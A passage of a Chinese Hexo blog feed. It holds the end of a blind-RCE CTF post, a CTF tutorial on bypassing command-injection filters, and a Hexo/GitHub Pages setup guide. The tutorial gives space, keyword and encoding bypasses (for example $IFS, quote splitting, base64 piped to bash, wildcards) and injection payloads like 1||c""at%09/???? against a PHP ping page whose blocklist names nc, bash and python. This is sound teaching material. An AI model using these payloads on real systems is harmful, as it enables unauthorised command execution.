src="https://i.loli.net/2021/07/23/MdWxceDCu3LykXP.png" alt="image.png"></p><p>不过运气是真的好哈哈哈，直接出来了路径，那就稳了啊，直接读它就完事儿了：</p><p><img src="https://i.loli.net/2021/07/23/7VhzlXgKQsyeaOm.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/23/fewhUp82PEVvgFS.png" alt="image.png"></p><p>出来了出来了，加上<code>&#123;&#125;</code>就是最终的flag，不过我看wp的时候方法都是用反弹shell做的，不知道我这种算不算非预期解，想了解那种方法的可以自行百度，这里也推荐两篇文章：</p><p><a href="https://www.extrader.top/posts/c714e372/">https://www.extrader.top/posts/c714e372/</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105351352">https://blog.csdn.net/qq_45521281/article/details/105351352</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无回显rce&quot;&gt;&lt;a href=&quot;#无回显rce&quot; class=&quot;headerlink&quot; title=&quot;无回显rce&quot;&gt;&lt;/a&gt;无回显rce&lt;/h1&gt;&lt;p&gt;在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行，借着这次总结rce的机会，就把它一起总结了&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>RCE篇之命令执行中的各种绕过</title>
    <link href="https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/"/>
    <id>https://arsenetang.github.io/2021/07/20/RCE%E7%AF%87%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/</id>
    <published>2021-07-20T06:32:34.996Z</published>
    <updated>2021-07-20T06:53:11.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行中的各种绕过"><a href="#命令执行中的各种绕过" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h1><p>在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤</p><span id="more"></span><h2 id="1-绕过空格"><a href="#1-绕过空格" class="headerlink" title="1.绕过空格"></a>1.绕过空格</h2><p>常见的绕过空格的方法有<code>$IFS$9</code>,<code>$IFS</code>,<code>$IFS$1</code>,<code>$&#123;IFS&#125;</code>,<code>%09</code>,$IFS是linux下的分隔符，加上{}或者后面加$表示截断，防止与后面的变量名粘连导致命令无法执行，而<code>$9</code>指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此<code>$9</code>相当于没有加东西，等于做了一个前后隔离，基本上用上面的方法都可以绕过空格了，还有一些不常用的方法，比如说用<code>cat&lt;a.txt</code>表示<code>cat a.txt</code>，<code>&#123;cat,flag.php&#125;</code>等等</p><h2 id="2-绕过分隔符"><a href="#2-绕过分隔符" class="headerlink" title="2.绕过分隔符"></a>2.绕过分隔符</h2><p>linux下执行两条不同的命令中间需要分隔符，分隔符一般都是用<code>||</code>或者<code>;</code> 这两个一般都会有一个不会被禁掉，直接用就行，<code>;</code>只起分隔作用，不关心彼此是否执行成功，所有命令都会执行，而<code>||</code>实现逻辑或的功能，只有在左边的命令执行失败时，右边的命令才会执行</p><h2 id="3-绕过关键字"><a href="#3-绕过关键字" class="headerlink" title="3.绕过关键字"></a>3.绕过关键字</h2><p>这个应该是最重要的了，每次过滤的重点就是关键字，一般绕过的方法如下：</p><h3 id="1-中间加入符号"><a href="#1-中间加入符号" class="headerlink" title="1.中间加入符号"></a>1.中间加入符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种我认为是最常见也是最简单的，你可以在命令中添加反斜杠\或者双引号&quot;或者反引号`来绕过正则匹配</span><br><span class="line">但要记住的是，两个字母之间反斜杠\只能加一个，双引号&quot;和反引号`因为要闭合所以只能加偶数个，否则就不能执行命令了：</span><br><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l&quot;&quot;s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca&quot;&quot;t /flag -&gt; c&quot;&quot;a&quot;&quot;t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure><h3 id="2-拆分命令绕过"><a href="#2-拆分命令绕过" class="headerlink" title="2.拆分命令绕过"></a>2.拆分命令绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种方法还是非常常见的，就是通过拆分和拼接的方式，可以绕过对命令和对文件名的正则匹配，达到执行命令的目的</span><br><span class="line">但这种方式有很大的弊端就是当分号被过滤掉之后就很难使用了：</span><br><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure><h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这种方法网上写的非常多，但我觉得实际能用的情况其实挺少的，而且构造它也相对比较麻烦，这里就简单推荐两种方法：</span><br><span class="line">1.base64</span><br><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造cat /flag为：</span><br><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d` /flag</span><br><span class="line">2.hex</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash </span><br><span class="line">其中77686F616D69是whoami的hex编码</span><br></pre></td></tr></table></figure><h3 id="4-通配符绕过"><a href="#4-通配符绕过" class="headerlink" title="4.通配符绕过"></a>4.通配符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这种方式主要是针对文件名那几个字符被过滤时可以使用，就是用?或者*来代替具体的字符</span><br><span class="line">但一定注意这是针对文件名的哈，命令是肯定不能直接这么用的，但linux下命令其实也是文件</span><br><span class="line">比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</span><br><span class="line">ls -&gt; /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line">像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br></pre></td></tr></table></figure><h2 id="4-例题解析—–BMZCTF-端午就该吃粽子"><a href="#4-例题解析—–BMZCTF-端午就该吃粽子" class="headerlink" title="4.例题解析—–BMZCTF 端午就该吃粽子"></a>4.例题解析—–BMZCTF 端午就该吃粽子</h2><p>前面的过程就不讲了，核心源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|&#x27;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)/i&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no no no!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no flag!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心语句是<code>shell_exec(&quot;ping -c 4 &quot;.$ip);</code>相当于就是一个有过滤情况下的命令执行，那按照前面讲的方法绕过的方法就很多了，很多种方法都可以拿到flag，我们先<code>ls</code>一下根目录，空格就用<code>%09</code>代替：</p><p><img src="https://i.loli.net/2021/07/20/Su8FlUMJ35Hx6k2.png" alt="image.png"></p><p>可以看到flag就在根目录下，那我们看它的方法就很多了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1||c&quot;&quot;at%09/????</span><br><span class="line">1||c\a\t$IFS$9/????</span><br><span class="line">1||/bin/c??$IFS/????</span><br><span class="line">1||c&quot;&quot;at%09$(find%09/%09-name%09f??g)</span><br><span class="line">等等等等非常多种，可以随意组合实现cat /flag这条命令,然后就得到flag了</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/20/cMWse5nqX7BR8CA.png" alt="image.png"></p><p>顺便这里再多讲一个，有的ctf题恶心人，他不把flag放根目录下，找它就很费功夫，就可以用下列语句找flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;find / -name flag*&quot;)：查找所有文件名匹配flag*的文件</span><br><span class="line">system(&quot;cat $(find / -name flag*)&quot;)：打印所有文件名匹配flag*的文件</span><br><span class="line">一般直接用第二条就可以打印出flag文件了,当然如果是有过滤的话就按照上面的方法绕过就好啦！</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;命令执行中的各种绕过&quot;&gt;&lt;a href=&quot;#命令执行中的各种绕过&quot; class=&quot;headerlink&quot; title=&quot;命令执行中的各种绕过&quot;&gt;&lt;/a&gt;命令执行中的各种绕过&lt;/h1&gt;&lt;p&gt;在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://arsenetang.github.io/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2021-07-10T06:02:45.800Z</published>
    <updated>2021-07-29T09:33:28.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客的过程及注意事项"><a href="#hexo-github搭建个人博客的过程及注意事项" class="headerlink" title="hexo+github搭建个人博客的过程及注意事项"></a>hexo+github搭建个人博客的过程及注意事项</h1><p>前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑</p><span id="more"></span><h2 id="第一步：工具安装"><a href="#第一步：工具安装" class="headerlink" title="第一步：工具安装"></a>第一步：工具安装</h2><p>首先是工具的安装，我们先安装GitBash，进入git官网：<a href="https://git-scm.com/">https://git-scm.com/</a>，直接点击download选择相应版本下载即可；</p><p>然后安装node.js，直接进入node官网：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>下载即可，安装时一定要勾选全部组件，以及<code>add to path</code>，让它给你自动配置环境变量，这样安装node.js时就已经完成了npm的安装以及环境变量的配置。完成后在cmd和Git Bash下都输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v # 会显示node版本号，说明安装成功</span><br><span class="line">npm -v # 会显示npm版本号，说明安装成功</span><br></pre></td></tr></table></figure><p>如果它显示<code>command not found</code>，可能就是环境变量配置有问题，记得用户变量也需要配置，把npm的用户变量配上就行</p><p><img src="https://i.loli.net/2021/07/10/XsaKNBVELxtguDZ.png" alt="image.png"></p><h2 id="第二步：GitHub注册"><a href="#第二步：GitHub注册" class="headerlink" title="第二步：GitHub注册"></a>第二步：GitHub注册</h2><p>然后进入到github官网：<a href="https://github.com/">https://github.com/</a>，注册一个自己的账号，邮箱和用户名要选择常用的哈，方便记住，然后在Git Bash上设置一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p>然后我们查看已设置的用户名和邮箱，能看到就说明设置成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/10/QRzEtF7N5smLBWv.png" alt="image.png"></p><h2 id="第三步：GitHub创建仓库及配置SSH-key"><a href="#第三步：GitHub创建仓库及配置SSH-key" class="headerlink" title="第三步：GitHub创建仓库及配置SSH key"></a>第三步：GitHub创建仓库及配置SSH key</h2><p>登录github后选择右上角+号，选择new repository，用户名必须为:<strong>你的用户名.github.io</strong>，这里必须注意，否则后面会出问题，那么将来你的网站首页地址就是：https://你的用户名.github.io了，就像下图这样(我的肯定是已注册）</p><p><img src="https://i.loli.net/2021/07/10/H4X37Lcn1hb2ElO.png" alt="image.png"></p><p>打开Git Bash，在里面输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码，当然你要设也可以，只是要记住，以后部署博客的时候需要用的，我觉得没太大必要，然后去用户主目录看有没有ssh密钥，就在这里面，如下图，将里面id_rsa.pub文件内容全部复制下来，注意看不要多了空格，换行符等等，id_rsa.pub是公钥，可以告诉他人，而id_rsa是私钥就不能泄露了，然后打开github设置密钥界面：<a href="https://github.com/settings/keys">https://github.com/settings/keys</a>，点击<code>New SSH key</code>,tiitle为标题可以随便取，然后内容为刚刚复制的id_rsa.pub公钥复制进去即可，最后点击<code>Add SSH key</code></p><p><img src="https://i.loli.net/2021/07/10/fIt52ZSewEAaJuV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/29/FWX5u2LzfBlbnY9.png" alt="image.png"></p><p>然后我们在Git Bash中验证是否连接成功，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里面需要注意的是，第一次输入的时候它会问你yes/no，你得输入yes后再回车，不能直接回车，然后显示出下图这个页面说明连接成功：</p><p><img src="https://i.loli.net/2021/07/10/dymWaeJu1Cl7SvP.png" alt="image.png"></p><h2 id="第四步：安装hexo"><a href="#第四步：安装hexo" class="headerlink" title="第四步：安装hexo"></a>第四步：安装hexo</h2><p><code>Hexo</code> 是一个简单、快速、强大的基于 <code>Github Pages</code> 的博客框架，支持 <code>Markdown</code> 格式，有众多优秀插件和主题。</p><p>然后我们就安装hexo，在Git Bash中操作哈，别用cmd，网上很多说直接用<code>$ npm install -g hexo-cli</code>直接安装的，我试了试一直不行，也不知道为什么，所以说我就先安装cnpm，这里我用的是淘宝的镜像源，如果错误就重来，因为连接可能不稳定，失败了多试几次就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v   #如果显示cnpm的版本信息就说明安装成功</span><br><span class="line">cnpm install -g hexo-cli   #安装 hexo（如果失败重新来过)</span><br><span class="line">hexo -v   #返回 hexo 的版本信息</span><br></pre></td></tr></table></figure><p>如果这里显示出了hexo的版本信息，就说明安装成功了，然后我们在电脑中随便找一个地方，建立一个空文件夹，以后你博客的所有东西就都在这里面操作，进入这个空文件夹，右键，点击Git Bash Here，打开Git Bash终端，然后输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init     #初始化 hexo</span><br><span class="line">ls -l     #查看初始化获得的文件</span><br><span class="line">hexo s    #启动 hexo，本地预览</span><br></pre></td></tr></table></figure><p>然后这里如果都没问题的话，就可以在本地4000端口查看自己的网站了，就是这个网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><h2 id="第五步：将博客部署到GitHub上"><a href="#第五步：将博客部署到GitHub上" class="headerlink" title="第五步：将博客部署到GitHub上"></a>第五步：将博客部署到GitHub上</h2><p>然后我们就需要将我们本地的博客搭到GitHub上去了，首先需要修改配置文件，打开博客文件夹中的配置文件<code>_config.yml</code>，需要进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class="line">那要么你就对照着看一下改就好:</span><br><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class="line">## Source: https://github.com/tommy351/hexo/</span><br><span class="line"></span><br><span class="line"># Site </span><br><span class="line">title: My Blog #博客名</span><br><span class="line">subtitle: to be continued... #副标题</span><br><span class="line">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class="line">author: Yourname #作者，在博客底部可以看到</span><br><span class="line">email: yourname@yourmail.com #你的联系邮箱</span><br><span class="line">language: zh-CN #中文。如果不填则默认英文</span><br><span class="line"></span><br><span class="line"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="line">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br><span class="line">url: http://yoursite.com</span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line"></span><br><span class="line"># Writing 文章布局、写作格式的定义，不修改</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">max_open_file: 100</span><br><span class="line">filename_case: 0</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  backtick_code_block: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class="line">## 2: Enable pagination</span><br><span class="line">## 1: Disable pagination</span><br><span class="line">## 0: Fully Disable</span><br><span class="line">archive: 1</span><br><span class="line">category: 1</span><br><span class="line">tag: 1</span><br><span class="line"></span><br><span class="line"># Server 不修改</span><br><span class="line">## Hexo uses Connect as a server</span><br><span class="line">## You can customize the logger format as defined in</span><br><span class="line">## http://www.senchalabs.org/connect/logger.html</span><br><span class="line">port: 4000</span><br><span class="line">logger: false</span><br><span class="line">logger_format:</span><br><span class="line"></span><br><span class="line"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="line">date_format: YYYY-M-D</span><br><span class="line">time_format: H:mm:ss</span><br><span class="line"></span><br><span class="line"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class="line">disqus_shortname:</span><br><span class="line"></span><br><span class="line"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class="line">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class="line">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class="line">theme: landscape</span><br><span class="line">exclude_generator:</span><br><span class="line">plugins:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line"># Deployment 站点部署到github要配置(重点！！！)</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: //这里是需要填的，下面会讲</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后我们打开Github个人主页的Repository，进入到自己的博客项目，复制项目的SSH码，这里一定要看清楚是复制SSH码哈，<a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;</a>开头的，然后粘贴到配置文件最后的repository中，粘贴好后CTRL+S保存即可：</p><p><img src="https://i.loli.net/2021/07/10/QPj8UKGsRDaLBI1.png" alt="image.png"></p><p>然后依次执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean // 清除存缓（不用每次执行）</span><br><span class="line">hexo g     // 修改生成</span><br><span class="line">hexo s     // 修改预览（不用每次执行） </span><br><span class="line">hexo d     // 修改部署</span><br></pre></td></tr></table></figure><p>最后一步<code>hexo d</code>是最重要的，但这里可能会出现<code>ERROR Deployer not found: git</code>报错，这是因为我们没有安装<code>hexo-deployer-git</code>这个插件，但因为安装这个插件需要新建文件夹，而在有的目录下新建文件夹需要管理员权限，这里就需要就在开始菜单输入cmd，并且以管理员身份运行就可，如下图：</p><p><img src="https://i.loli.net/2021/07/10/WvS8ol1GTty5hDL.png" alt="image.png"></p><p>然后执行<code>cnpm install hexo-deployer-git --save</code>安装这个插件，这里还有一个坑，就是必须要在站点目录下执行这句安装<code>hexo-deployer-git</code>的命令，所谓站点目录就是执行<code>hexo init</code>的目录，也就是建立博客的主文件夹，要在里面执行命令才行，如果已经在其他目录安装了<code>hexo-deployer-git</code>插件的小伙伴，可以使用以下命令卸载该插件：<code>cnpm uninstall hexo-deployer-git --save</code>，由于我们是打开的是cmd，所以说要先用<code>cd</code>命令转到站点目录下，然后执行命令安装<code>hexo-deployer-git</code>插件就行啦，然后<code>hexo d</code>就不会报错啦，等一两分钟去看自己博客主页就有东西啦！我们的博客就搭好啦！快往里面放东西吧！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;hexo-github搭建个人博客的过程及注意事项&quot;&gt;&lt;a href=&quot;#hexo-github搭建个人博客的过程及注意事项&quot; class=&quot;headerlink&quot; title=&quot;hexo+github搭建个人博客的过程及注意事项&quot;&gt;&lt;/a&gt;hexo+github搭建个人博客的过程及注意事项&lt;/h1&gt;&lt;p&gt;前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
